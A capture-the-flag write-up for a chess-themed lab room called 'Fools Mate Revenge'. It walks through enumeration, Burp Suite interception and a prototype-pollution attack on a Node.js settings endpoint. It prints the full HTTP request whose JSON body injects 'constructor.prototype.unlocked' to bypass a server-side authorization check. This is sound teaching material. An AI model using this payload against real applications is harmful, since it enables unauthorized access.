# Fools Mate Revenge

---

> **Note:** It's highly recommended to solve the original **Fools Mate** challenge before attempting this one.

## Initial Enumeration

As always, we start with some basic enumeration.

```bash
nmap -sV -sC 10.130.178.4
```

![](images/Pasted%20image%2020260729154255.png)

Heading over to the website, we immediately notice that it looks almost identical to the previous challenge, **Fools Mate**.

![](images/Pasted%20image%2020260729184557.png)

Naturally, the first thing to try is the same one-move checkmate.

This time, however, things are different.

Unlike the previous challenge, the move isn't blocked by the browser. The request is actually sent to the server, which means we can intercept it using **Burp Suite**.

![](images/Pasted%20image%2020260729184719.png)

Forwarding the request gives us the following response.

![](images/Pasted%20image%2020260729184758.png)

The response is actually more helpful than expected.

Rather than simply rejecting our move, the application reveals that it checks the value of **`session.config.unlocked`** before allowing a checkmate. That small detail tells us exactly where the server is making its authorization decision and immediately gives us a potential attack surface.

Since `session.config` is a JavaScript object, this strongly suggests the possibility of a **Prototype Pollution** vulnerability.

If the application is vulnerable, we may be able to modify the global `Object.prototype` instead of directly modifying `session.config`.

For example, if we manage to pollute the prototype with:

```json
"unlocked": true
```

then, the next time the server evaluates `session.config.unlocked`, JavaScript first checks whether the property exists directly on the `session.config` object.

If it doesn't, JavaScript automatically walks up the prototype chain until it reaches `Object.prototype`. Since we've injected an inherited **`unlocked`** property there, the lookup succeeds and returns **`true`**.

As a result, the server believes the session has already been unlocked, allowing the checkmate move to bypass the validation and return the flag.

---

## Exploitation

Looking through **app.js**, we find the function responsible for saving the user's preferences.

![](images/Pasted%20image%2020260729185315.png)

The function sends a POST request to **`/api/settings`**.

```js
async function savePrefs() {
  const prefs = {
    theme: themeSelect.value,
    pieceSet: pieceSetSelect.value,
    animationMs: Number(animSelect.value)
  };
  applyPrefs(prefs);
  try {
    const res = await fetch('/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(prefs)
    });
    const data = await res.json();
    if (data && data.preferences) applyPrefs(data.preferences);
  } catch (e) {}
  toast('Preferences saved');
}
```

Intercepting that request with Burp Suite lets us observe the JSON structure expected by the application.

![](images/Pasted%20image%2020260729185451.png)

Instead of sending the legitimate preferences, we replace the request body with a polluted JSON object.

```http
POST /api/settings HTTP/1.1
Host: 10.130.178.4:3000
Content-Type: application/json
Cookie: sid=74062660500c17ba3696f247f393fa84
Content-Length: 101

{"theme":"dark","pieceSet":"classic","animationMs":200,"constructor":{"prototype":{"unlocked":true}}}
```

![](images/Pasted%20image%2020260729185724.png)

The response doesn't explicitly confirm whether the pollution succeeded.

There's only one way to find out.

We simply return to the chessboard and perform the one-move checkmate (**Ra8 → Ra1**).

And...

![](images/Pasted%20image%2020260729185922.png)

Flag retrieved.

---

## Conclusion

I enjoyed this room even more than the original. Instead of focusing on client-side validation, it introduces a real-world **Prototype Pollution** vulnerability and shows how a seemingly harmless settings endpoint can be abused to change the application's behavior. 
It was a fun follow-up challenge and a great introduction to a vulnerability that's becoming increasingly important to understand.

Huge thanks to **DrGonz0** for creating this room!

**— 0xchnk**